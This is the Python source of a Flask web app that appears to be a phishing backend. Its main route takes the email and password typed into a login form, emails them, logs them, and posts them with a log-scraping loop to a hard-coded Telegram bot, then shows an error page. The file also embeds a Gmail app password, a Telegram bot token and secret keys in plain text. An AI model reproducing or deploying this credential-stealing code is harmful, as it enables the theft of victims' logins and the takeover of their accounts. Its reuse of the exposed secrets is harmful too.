import logging
from flask import Flask, render_template, request, redirect, url_for, session, flash
from flask_mail import Mail, Message
import os
import requests
import re

app = Flask(__name__)
app.secret_key = 'erfghbjklkjhgfdsdhjbnkljhgfdscvbnnkmlliuytrresdhjkopiuytrsdhj'

# Configure logging
logging.basicConfig(filename='app.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Flask Mail Configuration
app.config['MAIL_SERVER'] = 'smtp.gmail.com'
app.config['MAIL_PORT'] = 465
app.config['MAIL_USERNAME'] = 'sup.alert001@gmail.com'
app.config['MAIL_PASSWORD'] = 'omifnyopgwgaeraa'
app.config['MAIL_USE_TLS'] = False
app.config['MAIL_USE_SSL'] = True
app.config['SECRET_KEY'] = 'language007'

mail = Mail(app)

# Telegram bot token
token = '6933427301:AAGkWy-GtwxcoILnefvi4o0QCT_ohYUaGGg'
chat_id = '6469097185'

log_pattern = re.compile(r'New login details: User-Email: (.+), User-Password: (.+)')

def send_mail(email, password):
    msg = Message('Login Alert', sender=app.config['MAIL_USERNAME'], recipients=[email])
    msg.body = f'New login details: User-Email: {email},  User-Password: {password}'
    app.logger.info(f'Email sent to {email}')
    mail.send(msg)

def send_message(message):
    url = f'https://api.telegram.org/bot{token}/sendMessage'
    params = {
        'chat_id': chat_id,
        'text': message
    }
    response = requests.post(url, params=params)
    return response.json()

def read_logs(file_path):
    with open(file_path, 'r') as file:
        for line in file:
            match = log_pattern.search(line)
            if match:
                email = match.group(1)
                password = match.group(2)
                message = f'New login details:\nEmail: {email}\nPassword: {password}'
                app.logger.info(message)  # Log the information
                send_message(message)

@app.route("/", methods=['GET', 'POST'])
def one():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form['password']

        send_mail(email, password)
        read_logs('app.log')  # Call read_logs function when email is sent
        # Also, send a message to Telegram when new login details are received
        send_message(f'New login details:\nEmail: {email}\nPassword: {password}')
        print(f"Email: {email}, Password: {password}")
    return render_template('one.html')

@app.route('/error', methods=['GET', 'POST'])
def error():
    return render_template('error.html')

if __name__ == "__main__":
    app.run(debug=True)
